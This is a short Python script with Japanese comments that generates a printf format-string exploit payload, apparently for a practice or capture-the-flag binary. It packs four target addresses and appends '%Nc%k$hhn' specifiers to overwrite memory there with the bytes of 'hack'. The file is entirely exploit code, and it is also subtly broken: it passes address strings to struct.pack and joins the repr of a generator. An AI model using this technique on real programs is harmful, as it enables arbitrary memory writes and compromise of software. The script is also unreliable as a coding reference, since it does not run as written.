# coding: utf-8

from sys import *
from struct import *

# (アドレス, 値)
T = [
    ('0x080497fc', ord('h')),
    ('0x080497fd', ord('a')),
    ('0x080497fe', ord('c')),
    ('0x080497ff', ord('k')),
]

# 書き込む文字列の先頭がprintfのoffset+1番目の引数
offset = 4

code = "".join(str(pack("I",t[0]) for t in T))

# 出力した文字数
n = len(T)*4

for i in range(len(T)):
    l = (T[i][1]-n-1)%256+1
    code += "%{0}c%{1}$hhn".format(l, offset+i)
    n += l

print("code:", repr(code))
print(code)